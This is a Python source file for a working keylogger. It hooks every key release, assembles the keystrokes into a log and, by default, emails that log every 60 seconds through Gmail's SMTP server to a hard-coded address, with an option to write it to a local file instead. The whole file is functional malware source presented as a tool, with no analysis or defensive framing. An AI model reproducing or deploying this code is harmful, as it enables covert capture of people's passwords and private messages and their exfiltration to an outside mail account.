# Keylogger
import keyboard
import smtplib
# Time
from threading import Timer
from datetime import datetime
# Send every minute
SEND_REPORT_EVERY = 60
# Send to 
EMAIL_ADDRESS = "poop96590@gmail.com"
EMAIL_PASSWORD = "sorry i can't afford to have my password on the internet anymore"

class Keylogger:
    def __init__(self, interval, report_method="email"):
        # Pass SEND_REPORT_EVERY to interval
        self.interval = interval
        self.report_method = report_method
        # Keystrokes logged in 'self.interval'
        self.log = ""
        # Start and end date-time
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        # Key press event
        name = event.name
        if len(name) > 1:
            # Not a character, special key (e.g ctrl, alt, etc.)
            # Uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # New line
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # Replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # Add to self.log
        self.log += name

    def sendmail(self, email, password, message):
        # Connection to SMTP server
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # Connect to SMTP server as TLS mode
        server.starttls()
        # Login
        server.login(email, password)
        # Send email
        server.sendmail(email, email, message)
         # End session
        server.quit()

    def update_filename(self):
        # File names have start and end time
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
    # Create file in current directory and open the file in write mode
        with open(f"{self.filename}.txt", "w") as f:
            # Write the keys to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def report(self):
    # Send keys and reset `self.log`
        if self.log:
            # If there is something in log
            self.end_dt = datetime.now()
            # Update `self.filename`
            self.update_filename()
        if self.report_method == "email":
            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
        elif self.report_method == "file":
            self.report_to_file()
        # Print in the console
        # print(f"[{self.filename}] - {self.log}")
        self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # Set the thread to die when main thread dies
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):
        # Record the start time
        self.start_dt = datetime.now()
        # Start the keylogger
        keyboard.on_release(callback=self.callback)
        # Start reporting the keys
        self.report()
        # Wait until CTRL+C is pressed
        keyboard.wait()

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    keylogger.start()
